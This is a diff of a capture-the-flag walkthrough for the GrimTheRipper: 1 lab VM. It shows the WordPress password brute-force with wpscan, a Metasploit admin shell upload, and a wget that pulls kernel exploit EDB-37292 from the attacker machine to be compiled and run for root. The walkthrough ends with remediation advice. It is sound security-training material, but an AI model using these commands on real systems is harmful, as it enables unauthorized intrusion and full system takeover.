@@ -1,87 +1,94 @@
 # GrimTheRipper: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.8 (host-only) |
-| **Difficulty** | Easy |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.8 |
+| **Attacker IP** | 192.168.0.10 |
+| **Difficulty** | Easy/Medium |
 | **OS** | Linux (Ubuntu 12.04) |
-| **Root Flag** | /root (id output confirms root) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/grimtheripper-1,395/) |
+| **Goal** | root shell |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/grimtheripper-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → web page source (base64 path hint) → WordPress at `/1010101/wordpress/` → wpscan brute-force (admin:Password@123) → Metasploit wp_admin_shell_upload → shell → kernel exploit 37292 (Ubuntu 12.04) → root
+GrimTheRipper: 1 is a Linux VM that requires enumerating a hidden WordPress installation through chained clues encoded in HTML source (Base64 to binary path). WordPress admin credentials are cracked with `wpscan` and `rockyou.txt`. Metasploit's `wp_admin_shell_upload` module delivers a Meterpreter shell. Privilege escalation targets **Ubuntu 12.04** using a public kernel local privilege escalation exploit (EDB-37292).
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Web enumeration — decode base64 comment in page source
-3. Discover WordPress instance at hidden path
-4. wpscan brute-force attack
-5. Metasploit WordPress shell upload
-6. Kernel privilege escalation (CVE-2015-1328)
+1. Host discovery and nmap scan
+2. Web enumeration, hidden path via Base64-decoded HTML comment
+3. WordPress discovery and `wpscan` credential brute-force
+4. Metasploit `wp_admin_shell_upload` for initial access
+5. Kernel exploit (EDB-37292) for root
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
+netdiscover -r 192.168.0.0/24
+```
+
+Target: `192.168.0.8`.
+
+## Step 2: Port Scanning
+
+```bash
 nmap -A 192.168.0.8
 ```
 
-Open ports: 22 (SSH), 80 (HTTP).
+![nmap scan output](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
+Open ports: **22** (SSH) and **80** (HTTP).
 
----
+## Step 3: Web Enumeration
 
-## Step 2: Web Enumeration
+Browse to `http://192.168.0.8`. The default page shows an image of Kevin Hart — no obvious content.
 
-Browse to `http://192.168.0.8` — the page shows an image. Check the page source for a hidden comment:
-
-```bash
-curl -s http://192.168.0.8/ | grep -i "base64\|<!--"
-```
-
-The source contains a base64-encoded hint. Decode it:
-
-```bash
-echo 'THpFd0f1UQXhNREU5IHRyeSBoYXJk' | base64 -d
-# Decode to find a path hint
-echo 'LzEwMTAxMDE=' | base64 -d
-# /1010101
-```
+Run `dirb`:
 
 ```bash
 dirb http://192.168.0.8/
-# Finds /1010101/ directory
 ```
 
-![Web enumeration and base64 decode](images/02-web-enum.png)
+![dirb results](images/02-dirb.png)
 
----
+Discovered `index2`. Navigate to `http://192.168.0.8/index2` — a taunt page with a meme. View source.
 
-## Step 3: WordPress Discovery and Brute-Force
+A comment in the HTML contains a **Base64-encoded string**. Decode it:
 
-A WordPress site exists at `http://192.168.0.8/1010101/wordpress/`. The admin username is `admin`.
+```bash
+echo '<base64_string_from_source>' | base64 -d
+# Output: another Base64 string
+echo '<second_base64_string>' | base64 -d
+# Output: /1010101
+```
+
+The double-encoded string resolves to the path `/1010101`.
+
+## Step 4: WordPress Discovery
+
+Browse to `http://192.168.0.8/1010101/` — reveals a WordPress installation at `/1010101/wordpress/`. The author `admin` is visible on the site.
+
+![WordPress site at /1010101/wordpress/](images/03-wordpress.png)
+
+## Step 5: WordPress Credential Brute-Force
 
 ```bash
 wpscan --url http://192.168.0.8/1010101/wordpress/ \
-       --wp-content-dir /1010101/wordpress \
        -U admin \
-       -P /usr/share/wordlists/rockyou.txt
-# Credentials found: admin:Password@123
+       -P /usr/share/wordlists/rockyou.txt \
+       --wp-content-dir /1010101/wordpress
 ```
 
-![WordPress login brute-force](images/03-wordpress.png)
+Recovered credentials: **admin / Password@123**
 
----
+## Step 6: Initial Access — wp_admin_shell_upload
 
-## Step 4: Metasploit WordPress Shell Upload
+Use Metasploit to upload a PHP shell via the WordPress admin panel:
 
 ```bash
-msfconsole
+msfconsole -q
 use exploit/unix/webapp/wp_admin_shell_upload
 set RHOSTS 192.168.0.8
 set USERNAME admin
@@ -90,57 +97,71 @@ set TARGETURI /1010101/wordpress/
 exploit
 ```
 
-After a Meterpreter session opens:
+![Meterpreter shell established](images/04-shell.png)
+
+A Meterpreter session opens. Drop into a system shell:
 
 ```bash
-shell
+meterpreter> shell
 python -c 'import pty; pty.spawn("/bin/bash")'
-id
-# uid=33(www-data)
+```
+
+## Step 7: Privilege Escalation — Ubuntu 12.04 Kernel Exploit (EDB-37292)
+
+Check the OS version:
+
+```bash
 lsb_release -a
 # Ubuntu 12.04
 ```
 
-![Metasploit shell](images/04-metasploit.png)
-
----
-
-## Step 5: Kernel Privilege Escalation (EDB-37292)
-
-Ubuntu 12.04 is vulnerable to overlayfs local privilege escalation (CVE-2015-1328):
+On the attacker machine:
 
 ```bash
 searchsploit Ubuntu 12.04
 searchsploit -m 37292
-
-# On attacker machine — serve the exploit
 python -m SimpleHTTPServer 8000
+```
 
-# On target
+On the target:
+
+```bash
 cd /tmp
 wget http://192.168.0.10:8000/37292.c
 gcc 37292.c -o shell
 chmod 777 shell
 ./shell
 id
-# uid=0(root)
 ```
 
-![Root via kernel exploit](images/05-root.png)
+Output: `uid=0(root) gid=0(root) groups=0(root)`
+
+## Step 8: Root Flag
+
+```bash
+cd /root
+ls
+cat proof.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Weak WordPress credentials** — brute-forced in seconds with rockyou.txt; enforce strong password policies and rate-limiting on `/wp-login.php`
-2. **Hidden paths via base64 in source** — security through obscurity is not security; rely on access controls
-3. **WordPress admin shell upload** — restrict admin panel access to trusted IPs; keep WordPress updated
-4. **Outdated kernel (Ubuntu 12.04)** — end-of-life OS with known LPEs; upgrade or isolate with container security
+- **Hidden paths encoded in Base64** within HTML comments require methodical source inspection.
+- **Weak WordPress passwords** combined with unauthenticated user enumeration allow credential brute-force.
+- **wp_admin_shell_upload** is a reliable Metasploit module for WordPress admin access when credentials are known.
+- **Ubuntu 12.04 is end-of-life** and carries multiple unpatched kernel vulnerabilities. Running outdated OS versions is a critical risk.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Weak WP credentials | Use a strong password; add Fail2Ban or similar rate limiter |
-| Exposed WordPress admin | Restrict `/wp-admin/` to trusted IPs via `.htaccess` |
-| Kernel CVE-2015-1328 | Upgrade OS; apply kernel patches |
+|---|---|
+| WordPress weak admin password | Enforce strong passwords, use login attempt limiting plugins |
+| Authenticated arbitrary file upload | Restrict plugin/theme editor in `wp-config.php` (`DISALLOW_FILE_EDIT`) |
+| Outdated Ubuntu 12.04 kernel | Upgrade OS to a supported, patched version |
+| Sensitive paths in HTML comments | Remove all developer comments and hidden paths before production |
